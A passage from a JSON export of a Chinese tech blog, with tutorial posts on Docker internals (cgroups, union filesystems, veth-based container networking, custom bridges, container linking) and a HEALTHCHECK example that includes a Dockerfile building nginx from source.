内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，才能避免当多个容器同时运行时的对系统资源的竞争。控制组技术最早是由 Google 的程序员 2006 年起提出，Linux 内核自 2.6.24 开始支持。 控制组可以提供对容器的内存、CPU、磁盘 IO 等资源的限制和审计管理。 联合文件系统联合文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。联合文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。 另外，不同 Docker 容器就可以共享一些基础的文件系统层，同时再加上自己独有的改动层，大大提高了存储的效率。 Docker 中使用的 AUFS（AnotherUnionFS）就是一种联合文件系统。 AUFS 支持为每一个成员目录（类似 Git 的分支）设定只读（readonly）、读写（readwrite）和写出（whiteout-able）权限, 同时 AUFS 里有一个类似分层的概念, 对只读权限的分支可以逻辑上进行增量地修改(不影响只读部分的)。 Docker 目前支持的联合文件系统种类包括 AUFS, btrfs, vfs 和 DeviceMapper。 容器格式最初，Docker 采用了 LXC 中的容器格式。自 1.20 版本开始，Docker 也开始支持新的 libcontainer 格式，并作为默认选项。对更多容器格式的支持，还在进一步的发展中。 网络Docker 的网络实现其实就是利用了 Linux 上的网络名字空间和虚拟网络设备（特别是 veth pair）。建议先熟悉了解这两部分的基本概念再阅读本章。 基本原理首先，要实现网络通信，机器需要至少一个网络接口（物理接口或虚拟接口）来收发数据包；此外，如果不同子网之间要进行通信，需要路由机制。 Docker 中的网络接口默认都是虚拟的接口。虚拟接口的优势之一是转发效率较高。 Linux 通过在内核中进行数据复制来实现虚拟接口之间的数据转发，发送接口的发送缓存中的数据包被直接复制到接收接口的接收缓存中。对于本地系统和容器内系统看来就像是一个正常的以太网卡，只是它不需要真正同外部网络设备通信，速度要快很多。 Docker 容器网络就利用了这项技术。它在本地主机和容器内分别创建一个虚拟接口，并让它们彼此连通（这样的一对接口叫做 veth pair）。创建网络参数Docker 创建一个容器的时候，会执行如下操作： 创建一对虚拟接口，分别放到本地主机和新容器中；本地主机一端桥接到默认的 docker0 或指定网桥上，并具有一个唯一的名字，如 veth65f9； [root@docker ~]# docker run -d b2a 1885e6532b2ab0382595248bb41e960d22dce6446c5c8c4855a077afa3e19642 [root@docker ~]# ip addr 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1400 qdisc pfifo_fast state UP qlen 1000 link/ether fa:16:3e:f5:14:e3 brd ff:ff:ff:ff:ff:ff inet 10.173.32.46/21 brd 10.173.39.255 scope global dynamic eth0 valid_lft 79412sec preferred_lft 79412sec inet6 fe80::f816:3eff:fef5:14e3/64 scope link valid_lft forever preferred_lft forever 3: newnet0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP link/ether 2e:d8:d2:56:7e:42 brd ff:ff:ff:ff:ff:ff inet 172.10.100.1/24 scope global newnet0 valid_lft forever preferred_lft forever inet6 fe80::c855:eaff:fe8b:59e5/64 scope link valid_lft forever preferred_lft forever 4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN link/ether 02:42:5b:7b:5c:0e brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 scope global docker0 valid_lft forever preferred_lft forever 8: veth96ab152@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master newnet0 state UP link/ether 2e:d8:d2:56:7e:42 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::2cd8:d2ff:fe56:7e42/64 scope link valid_lft forever preferred_lft forever容器一端放到新容器中，并修改名字作为 eth0，这个接口只在容器的名字空间可见；从网桥可用地址段中获取一个空闲地址分配给容器的 eth0，并配置默认路由到桥接网卡 veth65f9。完成这些之后，容器就可以使用 eth0 虚拟网卡来连接其他容器和其他网络。 可以在 docker run 的时候通过 –net 参数来指定容器的网络配置，有4个可选值：–net=bridge 这个是默认值，连接到默认的网桥。–net=host 告诉 Docker 不要将容器网络放到隔离的名字空间中，即不要容器化容器内的网络。此时容器使用本地主机的网络，它拥有完全的本地主机接口访问权限。容器进程可以跟主机其它 root 进程一样可以打开低范围的端口，可以访问本地网络服务比如 D-bus，还可以让容器做一些影响整个主机系统的事情，比如重启主机。因此使用这个选项的时候要非常小心。如果进一步的使用 –privileged=true，容器会被允许直接配置主机的网络堆栈。–net=container:NAME_or_ID 让 Docker 将新建容器的进程放到一个已存在容器的网络栈中，新容器进程有自己的文件系统、进程列表和资源限制，但会和已存在的容器共享 IP 地址和端口等网络资源，两者进程可以直接通过 lo 环回接口通信。–net=none 让 Docker 将新容器放到隔离的网络栈中，但是不进行网络配置。之后，用户可以自己进行配置。 网络配置细节用户使用 –net=none 后，可以自行配置网络，让容器达到跟平常一样具有访问网络的权限。通过这个过程，可以了解 Docker 配置网络的细节。首先，启动一个 /bin/bash 容器，指定 –net=none 参数。 [root@docker ~]# docker run -i -t --rm --net=none b2a /bin/bash [root@8c1de00afa1a /]# ifconfig lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)在本地主机查找容器的进程 id，并为它创建网络命名空间。 [root@docker ~]# docker inspect -f &apos;{{.State.Pid}}&apos; 8c1 18515 [root@docker ~]# pid=18515 [root@docker ~]# mkdir -p /var/run/netns [root@docker ~]# ln -s /proc/$pid/ns/net /var/run/netns/$pid [root@docker ~]#检查桥接网卡的 IP 和子网掩码信息。 [root@docker ~]# ip addr show docker0 4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN link/ether 02:42:5b:7b:5c:0e brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 scope global docker0 valid_lft forever preferred_lft forever创建一对 “veth pair” 接口 A 和 B，绑定 A 到网桥 docker0，并启用它 [root@docker ~]# ip link add A type veth peer name B [root@docker ~]# brctl addif docker0 A [root@docker ~]# ip link set A up将B放到容器的网络命名空间，命名为 eth0，启动它并配置一个可用 IP（桥接网段）和默认网关。 [root@docker ~]# ip link set B netns $pid [root@docker ~]# ip netns exec $pid ip link set dev B name eth0 [root@docker ~]# ip netns exec $pid ip link set eth0 up此时返回容器去看下接口会发现多了一个 eth0 但是还没有 ip 地址 [root@8c1de00afa1a /]# ifconfig lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) [root@8c1de00afa1a /]# ifconfig eth0 Link encap:Ethernet HWaddr 1A:A5:37:49:F9:25 inet6 addr: fe80::18a5:37ff:fe49:f925/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:12 errors:0 dropped:0 overruns:0 frame:0 TX packets:6 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1016 (1016.0 b) TX bytes:508 (508.0 b) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)分配 ip [root@docker ~]# ip netns exec $pid ip addr add 172.17.0.5/16 dev eth0 [root@docker ~]# ip netns exec $pid ip route add default via 172.16.0.1然后查看容器网卡配置 [root@8c1de00afa1a /]# ifconfig eth0 Link encap:Ethernet HWaddr 1A:A5:37:49:F9:25 inet addr:172.17.0.5 Bcast:0.0.0.0 Mask:255.255.0.0 inet6 addr: fe80::18a5:37ff:fe49:f925/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:16 errors:0 dropped:0 overruns:0 frame:0 TX packets:8 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1296 (1.2 KiB) TX bytes:648 (648.0 b) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)宿主机看下路由表 [root@docker ~]# route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 10.173.32.1 0.0.0.0 UG 100 0 0 eth0 10.173.16.0 10.173.32.1 255.255.248.0 UG 100 0 0 eth0 10.173.32.0 0.0.0.0 255.255.248.0 U 100 0 0 eth0 10.176.48.0 10.173.32.1 255.255.240.0 UG 100 0 0 eth0 10.206.28.0 10.173.32.1 255.255.252.0 UG 100 0 0 eth0 169.254.169.254 10.173.32.1 255.255.255.255 UGH 100 0 0 eth0 172.10.100.0 0.0.0.0 255.255.255.0 U 0 0 0 newnet0 172.17.0.0 0.0.0.0 255.255.0.0 U 0 0 0 docker0 测试下 ping [root@docker ~]# ping 172.17.0.5 PING 172.17.0.5 (172.17.0.5) 56(84) bytes of data. 64 bytes from 172.17.0.5: icmp_seq=1 ttl=64 time=0.080 ms 64 bytes from 172.17.0.5: icmp_seq=2 ttl=64 time=0.060 ms 64 bytes from 172.17.0.5: icmp_seq=3 ttl=64 time=0.062 ms 64 bytes from 172.17.0.5: icmp_seq=4 ttl=64 time=0.060 ms 64 bytes from 172.17.0.5: icmp_seq=5 ttl=64 time=0.064 ms 64 bytes from 172.17.0.5: icmp_seq=6 ttl=64 time=0.056 ms 以上，就是 Docker 配置网络的具体过程。 当容器结束后，Docker 会清空容器，容器内的 eth0 会随网络命名空间一起被清除，A 接口也被自动从 docker0 卸载。此外，用户可以使用 ip netns exec 命令来在指定网络名字空间中进行配置，从而配置容器内的网络。 上面的 inspect 是获取 docker 的元数据 [root@docker ~]# docker inspect 188 [ { &quot;Id&quot;: &quot;1885e6532b2ab0382595248bb41e960d22dce6446c5c8c4855a077afa3e19642&quot;, &quot;Created&quot;: &quot;2017-10-11T11:23:55.910092338Z&quot;, &quot;Path&quot;: &quot;/usr/bin/supervisord&quot;, &quot;Args&quot;: [], &quot;State&quot;: { &quot;Status&quot;: &quot;running&quot;, &quot;Running&quot;: true, &quot;Paused&quot;: false, &quot;Restarting&quot;: false, &quot;OOMKilled&quot;: false, &quot;Dead&quot;: false, &quot;Pid&quot;: 18422, &quot;ExitCode&quot;: 0, &quot;Error&quot;: &quot;&quot;, &quot;StartedAt&quot;: &quot;2017-10-11T11:23:56.615025578Z&quot;, &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot; }, &quot;Image&quot;: &quot;sha256:b2ab0ed558bbf7f0ac3ecbe49454661ff1e28843652c8a4ce68e20c93885eea8&quot;, &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/1885e6532b2ab0382595248bb41e960d22dce6446c5c8c4855a077afa3e19642/resolv.conf&quot;, &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/1885e6532b2ab0382595248bb41e960d22dce6446c5c8c4855a077afa3e19642/hostname&quot;, &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/1885e6532b2ab0382595248bb41e960d22dce6446c5c8c4855a077afa3e19642/hosts&quot;, &quot;LogPath&quot;: &quot;&quot;, &quot;Name&quot;: &quot;/reverent_feynman&quot;, &quot;RestartCount&quot;: 0, &quot;Driver&quot;: &quot;devicemapper&quot;, &quot;MountLabel&quot;: &quot;&quot;, &quot;ProcessLabel&quot;: &quot;&quot;, &quot;AppArmorProfile&quot;: &quot;&quot;, &quot;ExecIDs&quot;: null, &quot;HostConfig&quot;: { &quot;Binds&quot;: null, &quot;ContainerIDFile&quot;: &quot;&quot;, &quot;LogConfig&quot;: { &quot;Type&quot;: &quot;journald&quot;, &quot;Config&quot;: {} }, &quot;NetworkMode&quot;: &quot;default&quot;, &quot;PortBindings&quot;: {}, &quot;RestartPolicy&quot;: { &quot;Name&quot;: &quot;no&quot;, &quot;MaximumRetryCount&quot;: 0 }, &quot;AutoRemove&quot;: false, &quot;VolumeDriver&quot;: &quot;&quot;, &quot;VolumesFrom&quot;: null, &quot;CapAdd&quot;: null, &quot;CapDrop&quot;: null, &quot;Dns&quot;: [], &quot;DnsOptions&quot;: [], &quot;DnsSearch&quot;: [], &quot;ExtraHosts&quot;: null, &quot;GroupAdd&quot;: null, &quot;IpcMode&quot;: &quot;&quot;, &quot;Cgroup&quot;: &quot;&quot;, &quot;Links&quot;: null, &quot;OomScoreAdj&quot;: 0, &quot;PidMode&quot;: &quot;&quot;, &quot;Privileged&quot;: false, &quot;PublishAllPorts&quot;: false, &quot;ReadonlyRootfs&quot;: false, &quot;SecurityOpt&quot;: null, &quot;UTSMode&quot;: &quot;&quot;, &quot;UsernsMode&quot;: &quot;&quot;, &quot;ShmSize&quot;: 67108864, &quot;Runtime&quot;: &quot;docker-runc&quot;, &quot;ConsoleSize&quot;: [ 0, 0 ], &quot;Isolation&quot;: &quot;&quot;, &quot;CpuShares&quot;: 0, &quot;Memory&quot;: 0, &quot;CgroupParent&quot;: &quot;&quot;, &quot;BlkioWeight&quot;: 0, &quot;BlkioWeightDevice&quot;: null, &quot;BlkioDeviceReadBps&quot;: null, &quot;BlkioDeviceWriteBps&quot;: null, &quot;BlkioDeviceReadIOps&quot;: null, &quot;BlkioDeviceWriteIOps&quot;: null, &quot;CpuPeriod&quot;: 0, &quot;CpuQuota&quot;: 0, &quot;CpusetCpus&quot;: &quot;&quot;, &quot;CpusetMems&quot;: &quot;&quot;, &quot;Devices&quot;: [], &quot;DiskQuota&quot;: 0, &quot;KernelMemory&quot;: 0, &quot;MemoryReservation&quot;: 0, &quot;MemorySwap&quot;: 0, &quot;MemorySwappiness&quot;: -1, &quot;OomKillDisable&quot;: false, &quot;PidsLimit&quot;: 0, &quot;Ulimits&quot;: null, &quot;CpuCount&quot;: 0, &quot;CpuPercent&quot;: 0, &quot;IOMaximumIOps&quot;: 0, &quot;IOMaximumBandwidth&quot;: 0 }, &quot;GraphDriver&quot;: { &quot;Name&quot;: &quot;devicemapper&quot;, &quot;Data&quot;: { &quot;DeviceId&quot;: &quot;30&quot;, &quot;DeviceName&quot;: &quot;docker-253:1-264043-8a37638169eca6bbd7696fc0006bc49134f3053b1bcdc807b7420091a3682d20&quot;, &quot;DeviceSize&quot;: &quot;10737418240&quot; } }, &quot;Mounts&quot;: [], &quot;Config&quot;: { &quot;Hostname&quot;: &quot;1885e6532b2a&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;ExposedPorts&quot;: { &quot;22/tcp&quot;: {} }, &quot;Tty&quot;: false, &quot;OpenStdin&quot;: false, &quot;StdinOnce&quot;: false, &quot;Env&quot;: [ &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot; ], &quot;Cmd&quot;: [ &quot;/usr/bin/supervisord&quot; ], &quot;Image&quot;: &quot;b2a&quot;, &quot;Volumes&quot;: null, &quot;WorkingDir&quot;: &quot;&quot;, &quot;Entrypoint&quot;: null, &quot;OnBuild&quot;: null, &quot;Labels&quot;: { &quot;License&quot;: &quot;GPLv2&quot;, &quot;Vendor&quot;: &quot;CentOS&quot; } }, &quot;NetworkSettings&quot;: { &quot;Bridge&quot;: &quot;&quot;, &quot;SandboxID&quot;: &quot;3b054233e045802972dc76e379b75646a259dc362ad0988911c55eac3dc1309f&quot;, &quot;HairpinMode&quot;: false, &quot;LinkLocalIPv6Address&quot;: &quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;: 0, &quot;Ports&quot;: { &quot;22/tcp&quot;: null }, &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/3b054233e045&quot;, &quot;SecondaryIPAddresses&quot;: null, &quot;SecondaryIPv6Addresses&quot;: null, &quot;EndpointID&quot;: &quot;fcf66e2ade2ad3cc227f6cf92ad77d3afa4e0776ed62ae82fdf8a0a49f28753a&quot;, &quot;Gateway&quot;: &quot;172.10.100.1&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;IPAddress&quot;: &quot;172.10.100.2&quot;, &quot;IPPrefixLen&quot;: 24, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;MacAddress&quot;: &quot;02:42:ac:0a:64:02&quot;, &quot;Networks&quot;: { &quot;bridge&quot;: { &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;d31724418dfab64ce197b123010438e282aec03345a2e5afb49b25bae5053775&quot;, &quot;EndpointID&quot;: &quot;fcf66e2ade2ad3cc227f6cf92ad77d3afa4e0776ed62ae82fdf8a0a49f28753a&quot;, &quot;Gateway&quot;: &quot;172.10.100.1&quot;, &quot;IPAddress&quot;: &quot;172.10.100.2&quot;, &quot;IPPrefixLen&quot;: 24, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;02:42:ac:0a:64:02&quot; } } } } ] [root@docker ~]# docker inspect 188 | grep Pid &quot;Pid&quot;: 18422, &quot;PidMode&quot;: &quot;&quot;, &quot;PidsLimit&quot;: 0, [root@docker ~]# docker inspect -f &apos;{{.State.Pid}}&apos; 188 18422 [root@docker ~]#OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 –type :为指定类型返回JSON 例如 [root@aliyun ~]# docker inspect --format=&apos;{{ range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&apos; 109 192.168.0.2","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker的网络管理","slug":"Docker的网络管理","date":"2017-10-11T10:16:35.000Z","updated":"2021-02-26T06:05:29.245Z","comments":true,"path":"posts/33287.html","link":"","permalink":"https://awen.me/posts/33287.html","excerpt":"安装 bridge[root@docker ~]# yum -y install bridge-utils","text":"安装 bridge[root@docker ~]# yum -y install bridge-utils 配置接口和 ip[root@docker ~]# brctl addbr newnet0 [root@docker ~]# ifconfig newnet0 172.10.100.0/24 [root@docker ~]# ifconfig newnet0 up [root@docker ~]# systemctl start docker修改 docker 配置[root@docker ~]# vi /etc/sysconfig/docker OPTIONS=&apos;--selinux-enabled -b=newnet0 --log-driver=journald --signature-verification=false&apos; if [ -z &quot;${DOCKER_CERT_PATH}&quot; ]; then DOCKER_CERT_PATH=/etc/docker fi重启systemctl restart docker新建一个容器[root@docker ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/public/centos 6.7-tools b2ab0ed558bb 7 months ago 601.9 MB [root@docker ~]# docker run -d 62a Unable to find image &apos;62a:latest&apos; locally Trying to pull repository docker.io/library/62a ... ^C [root@docker ~]# docker run -d b2a cf94a076384f176762a8be69a8e82b705bcb52cb36b20f3b269a065776a63455 [root@docker ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES cf94a076384f b2a &quot;/usr/bin/supervisord&quot; 4 seconds ago Up 3 seconds 22/tcp suspicious_hamilton [root@docker ~]# docker exec -it cf9 /bin/bash [root@cf94a076384f /]# ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:0A:64:02 inet addr:172.10.100.2 Bcast:0.0.0.0 Mask:255.255.255.0 inet6 addr: fe80::42:acff:fe0a:6402/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:8 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:648 (648.0 b) TX bytes:648 (648.0 b) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) [root@cf94a076384f /]#查看发现 ip 地址是刚才创建的了。 注意：本测试环境为 centos 7 下","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker 容器之间互联","slug":"Docker-容器之间互联","date":"2017-10-11T07:45:55.000Z","updated":"2021-02-26T06:05:29.244Z","comments":true,"path":"posts/44016.html","link":"","permalink":"https://awen.me/posts/44016.html","excerpt":"使用 –link 参数可以让容器之间安全的进行交互 [root@redis ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/public/redis 2.8.4 4888527e1254 13 months ago 190.4 MB hub.c.163.com/public/nginx 1.2.1 2dc68ff797db 18 months ago 171.5 MB","text":"使用 –link 参数可以让容器之间安全的进行交互 [root@redis ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE hub.c.163.com/public/redis 2.8.4 4888527e1254 13 months ago 190.4 MB hub.c.163.com/public/nginx 1.2.1 2dc68ff797db 18 months ago 171.5 MB 新建一个容器 redis [root@redis ~]# docker run -d --name redis 488 adde428a0a39627cc5134b9313cc0746f3551794ccb7c57b04fa816fddba7131新建一个容器 app [root@redis ~]# docker run -d –name app –link db:db 2dcf44ad0a211ea2f20433d101c78840562c8f79ca675c80048965459dd0bbd7a68 –link 参数的格式为 –link name：alias，其中 name 是要连接的容器名称，alias 是连接的别名。 查看进程 [root@redis ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f44ad0a211ea 2dc &quot;/bin/sh -c &apos;/etc/ini&quot; 3 seconds ago Up 2 seconds 22/tcp, 80/tcp, 443/tcp app e918789d6aee 488 &quot;/run.sh&quot; About a minute ago Up About a minute 6379/tcp db查看 hosts 文件会发现有db 的 ip 是172.17.0.2 [root@redis ~]# docker exec -it f44 /bin/bash root@f44ad0a211ea:/# cat /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.2 db e918789d6aee 172.17.0.3 f44ad0a211eaping 下试试 root@f44ad0a211ea:/# ping db PING db (172.17.0.2) 56(84) bytes of data. 64 bytes from db (172.17.0.2): icmp_req=1 ttl=64 time=0.107 ms 64 bytes from db (172.17.0.2): icmp_req=2 ttl=64 time=0.080 ms 64 bytes from db (172.17.0.2): icmp_req=3 ttl=64 time=0.100 ms ^C --- db ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 1999ms rtt min/avg/max/mdev = 0.080/0.095/0.107/0.016 msTelnet db 的端口 root@f44ad0a211ea:/# telnet 172.17.0.2 6379 Trying 172.17.0.2... Connected to 172.17.0.2. Escape character is &apos;^]&apos;.","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker 的健康检测","slug":"Docker-的健康监测","date":"2017-10-11T03:18:13.000Z","updated":"2021-02-26T06:05:29.244Z","comments":true,"path":"posts/12347.html","link":"","permalink":"https://awen.me/posts/12347.html","excerpt":"通常我们为了防止容器断电或异常关闭后不能自动开机，我们可以加上 --restart=always 例如 [root@aliyun ~]# docker run --restart=always -d --name blog -d -v /www:/www -v /wwwlogs:/var/log/wwwlogs -p 65423:65422 -p 80:80 -p 443:443 677 7714a84063ee6d405c80b891254bba0e5930f5d271c5ad76cfd6e2f0058d8056这样容器就可以自动重启，但是有时候程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。","text":"通常我们为了防止容器断电或异常关闭后不能自动开机，我们可以加上 --restart=always 例如 [root@aliyun ~]# docker run --restart=always -d --name blog -d -v /www:/www -v /wwwlogs:/var/log/wwwlogs -p 65423:65422 -p 80:80 -p 443:443 677 7714a84063ee6d405c80b891254bba0e5930f5d271c5ad76cfd6e2f0058d8056这样容器就可以自动重启，但是有时候程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。 而自 1.12 之后，Docker 提供了 HEALTHCHECK 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。 当在一个镜像指定了 HEALTHCHECK 指令后，用其启动容器，初始状态会为 starting，在 HEALTHCHECK 指令检查成功后变为 healthy，如果连续一定次数失败，则会变为 unhealthy。 HEALTHCHECK 支持下列选项： –interval=&lt;间隔&gt;：两次健康检查的间隔，默认为 30 秒； –timeout=&lt;时长&gt;：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒； –retries=&lt;次数&gt;：当连续失败指定次数后，则将容器状态视为 unhealthy，默认 3 次。和 CMD, ENTRYPOINT 一样，HEALTHCHECK 只可以出现一次，如果写了多个，只有最后一个生效。 在 HEALTHCHECK [选项] CMD 后面的命令，格式和 ENTRYPOINT 一样，分为 shell 格式，和 exec 格式。命令的返回值决定了该次健康检查的成功与否：0：成功；1：失败；2：保留，不要使用这个值。 下面我们看下这个 dockerfile 文件 FROM centos LABEL maintainer &quot;awen Email: &lt;hi@awen.me&gt;&quot; WORKDIR /opt/ COPY CentOS7-Base-163.repo /etc/yum.repos.d/CentOS-Base.repo COPY nginx /etc/init.d/nginx ENV NGINX_V=1.13.5 \\ OPENSSL_V=1.0.2l \\ PCRE_V=8.41 \\ ZLIB_V=1.2.11 RUN yum -y update \\ &amp;&amp; yum -y install openssh-server openssl gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget make perl tar net-tools \\ &amp;&amp; wget -c -4 https://nginx.org/download/nginx-$NGINX_V.tar.gz \\ &amp;&amp; wget -c -4 https://www.openssl.org/source/openssl-$OPENSSL_V.tar.gz \\ &amp;&amp; wget -c -4 ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-$PCRE_V.tar.gz \\ &amp;&amp; wget -c -4 http://zlib.net/zlib-$ZLIB_V.tar.gz \\ &amp;&amp; groupadd -r www &amp;&amp; useradd -r -g www www \\ &amp;&amp; tar zxvf zlib-$ZLIB_V.tar.gz \\ &amp;&amp; cd zlib-$ZLIB_V \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf pcre-$PCRE_V.tar.gz \\ &amp;&amp; cd pcre-$PCRE_V \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf openssl-$OPENSSL_V.tar.gz \\ &amp;&amp; tar zxvf nginx-$NGINX_V.tar.gz \\ &amp;&amp; cd nginx-$NGINX_V \\ &amp;&amp; ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/pcre-$PCRE_V --with-http_ssl_module --with-zlib=/opt/zlib-$ZLIB_V --with-openssl=/opt/openssl-$OPENSSL_V --with-http_v2_module --with-http_ssl_module \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; rm -rf /opt/* \\ &amp;&amp; mkdir -p /usr/local/nginx/ssl \\ &amp;&amp; mkdir -p /usr/local/nginx/conf/vhost \\ &amp;&amp; mkdir -p /var/log/wwwlogs/ \\ &amp;&amp; mkdir -p /www/ \\ &amp;&amp; ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &apos;&apos; \\ &amp;&amp; echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/PasswordAuthentication yes/PasswordAuthentication no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/UsePAM yes/UsePAM no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/#Port 22/Port 65422/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; yum clean all \\ &amp;&amp; mkdir 